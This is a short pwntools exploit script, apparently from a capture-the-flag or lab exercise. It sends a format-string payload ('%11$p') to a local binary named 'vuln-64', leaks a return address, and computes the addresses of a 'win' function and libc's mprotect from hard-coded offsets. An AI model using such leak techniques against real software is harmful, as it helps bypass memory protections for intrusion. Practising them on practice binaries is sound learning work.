from pwn import *

context(os='linux', arch='amd64')
io=process('./vuln-64')

io.sendline(b'%11$p') #fill in 00 to find ret addy in stack
ret_addr = int(io.recvline(),16)

libc = io.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

win = ret_addr - 331 #fill in w difference between ret_addr and win function

mprotect = libc + 0x1010f0 #fill in w offset from start of libc that mprotect is

print("win: ", hex(win))
print("mprotect: ", hex(mprotect))

io.close()